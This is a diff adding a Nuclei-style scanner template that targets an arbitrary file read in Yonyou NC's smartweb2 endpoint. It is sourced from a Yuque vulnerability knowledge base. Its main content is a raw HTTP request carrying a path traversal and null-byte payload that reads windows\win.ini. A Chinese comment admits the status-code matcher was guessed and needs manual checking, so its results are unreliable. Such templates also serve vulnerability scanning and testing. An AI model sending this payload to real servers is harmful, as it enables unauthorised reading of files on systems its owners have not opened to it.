@@ -1,0 +1,22 @@
+id: poc-rcsii92m891osg6f
+info:
+  name: yongyouNC smartweb2存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rcsii92m891osg6f
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rcsii92m891osg6f
+http:
+- raw:
+  - 'GET /hrss/dorado/smartweb2.loadConst.d?language=zh&country=\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini%00.html HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
